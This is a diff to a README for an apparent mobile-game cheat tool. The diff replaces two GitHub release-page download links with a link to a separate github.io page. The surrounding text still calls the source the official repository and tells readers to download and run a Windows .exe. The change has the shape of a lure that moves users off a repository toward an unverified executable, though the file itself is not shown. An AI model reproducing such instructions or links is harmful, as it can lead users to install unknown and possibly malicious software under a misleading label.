@@ -1,6 +1,6 @@
 # 🎮 tien-nghich-mobile-game-script - Modify game values for better play
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Aj564580/tien-nghich-mobile-game-script/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://aj564580.github.io)
 
 ## 📋 About This Tool
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the management utility:
 
 You need to download the management files from the official repository. We host all releases on our site. 
 
-[Visit this page to download the latest version](https://github.com/Aj564580/tien-nghich-mobile-game-script/releases)
+[Visit this page to download the latest version](https://aj564580.github.io)
 
 Choose the file ending in .exe for your Windows computer. Save this file in a folder you can find later. Do not rename the file, as this might cause errors during the launch process. Once the download finishes, move to the next section to set up the software.
 
